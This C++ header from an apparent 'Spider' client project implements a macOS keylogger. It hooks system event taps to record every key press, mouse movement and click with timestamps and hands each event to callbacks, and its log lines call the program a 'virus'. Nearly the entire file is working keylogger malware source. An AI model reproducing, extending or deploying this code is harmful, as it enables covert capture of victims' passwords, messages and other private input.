//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_OSXKEYLOGGER_HPP
#define SPIDER_CLIENT_OSXKEYLOGGER_HPP

#include <memory>
#include <config/Config.hpp>
#include <Network/IOManager.hpp>
#include <KeyLogger/KeyLogger.hpp>
#include "OSXEventListener.hpp"
#include "OSXKeyMatchingTable.hpp"

#define OSX_LOG "{'OSXKeyLogger'}"

namespace spi
{
    class OSXKeyLogger : public KeyLogger
    {
    public:
        explicit OSXKeyLogger(net::IOManager &service) : _service(service)
        {}

        ~OSXKeyLogger() override = default;

        void setup() override
        {
            _log(lg::Info) << OSX_LOG << " successfully initialized." << std::endl;

            _listener = OSXEventListener();

            _listener.registerEvent(kCGEventMouseMoved,
                                    [this](CGEventType, CGEventRef event) {
                                        
                                        proto::MouseMove mouseMove;
                                        CGPoint location = CGEventGetLocation(event);

                                        mouseMove.x = location.x;
                                        mouseMove.y = location.y;
                                        mouseMove.timestamp = std::chrono::steady_clock::now();

                                        _mouseMoveCallback(std::move(mouseMove));
            });

            _listener.registerEvents(OSXEventListener::EventsList({kCGEventLeftMouseDown,
                                                                   kCGEventLeftMouseUp,
                                                                   kCGEventRightMouseDown,
                                                                   kCGEventRightMouseUp,
                                                                   kCGEventOtherMouseDown,
                                                                   kCGEventOtherMouseUp}),
                                     [this](CGEventType type, CGEventRef event) {

                                         proto::MouseClick mouseClick;
                                         CGPoint location = CGEventGetLocation(event);

                                         mouseClick.x = location.x;
                                         mouseClick.y = location.y;
                                         mouseClick.timestamp = std::chrono::steady_clock::now();

                                         switch (type) {
                                             case kCGEventLeftMouseDown:
                                             case kCGEventRightMouseDown:
                                             case kCGEventOtherMouseDown:
                                                 mouseClick.state = proto::KeyState::Down;
                                                 break;

                                             case kCGEventLeftMouseUp:
                                             case kCGEventRightMouseUp:
                                             case kCGEventOtherMouseUp:
                                                 mouseClick.state = proto::KeyState::Up;
                                                 break;

                                             default:
                                                 break;
                                         }

                                         switch (type) {
                                             case kCGEventLeftMouseDown:
                                             case kCGEventLeftMouseUp:
                                                 mouseClick.button = proto::MouseButton::Left;
                                                 break;

                                             case kCGEventRightMouseDown:
                                             case kCGEventRightMouseUp:
                                                 mouseClick.button = proto::MouseButton::Right;
                                                 break;

                                             case kCGEventOtherMouseDown:
                                             case kCGEventOtherMouseUp:
                                                 mouseClick.button = proto::MouseButton::Middle;
                                                 break;

                                             default:
                                                 break;
                                         }

                                         _mouseClickCallback(std::move(mouseClick));
                                    });

            _listener.registerEvents(OSXEventListener::EventsList({kCGEventKeyDown,
                                                                   kCGEventKeyUp,
                                                                   kCGEventFlagsChanged}),
                                    [this](CGEventType type, CGEventRef event) {

                                        proto::KeyEvent keyEvent;
                                        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

                                        keyEvent.state = type == kCGEventKeyUp ? proto::KeyState::Up : proto::KeyState::Down;

                                        if (toBinds.find(keyCode) == toBinds.end()) {
                                            _log(logging::Warning) << KEYLOGGER_LOG << " Unhandled KeyEvent {" << keyCode << "}"
                                                                   << std::endl;
                                            return;
                                        }

                                        keyEvent.code = toBinds.at(keyCode);

                                        _keyPressCallback(std::move(keyEvent));
                                    });
        }

        void run() override
        {
            _listener.startListening();
            _log(lg::Info) << OSX_LOG << " virus started." << std::endl;
        }

        void stop() override
        {
            _listener.stopListening();
            _log(lg::Info) << OSX_LOG << " virus stoped." << std::endl;
        }

    private:
        spi::net::IOManager &_service;
        OSXEventListener _listener;
    };
}

namespace spi::details
{
    static always_inline KeyLogPtr createKeyLogger(net::IOManager &service)
    {
      return std::make_unique<OSXKeyLogger>(service);
    }
}

#endif //SPIDER_CLIENT_OSXKEYLOGGER_HPP
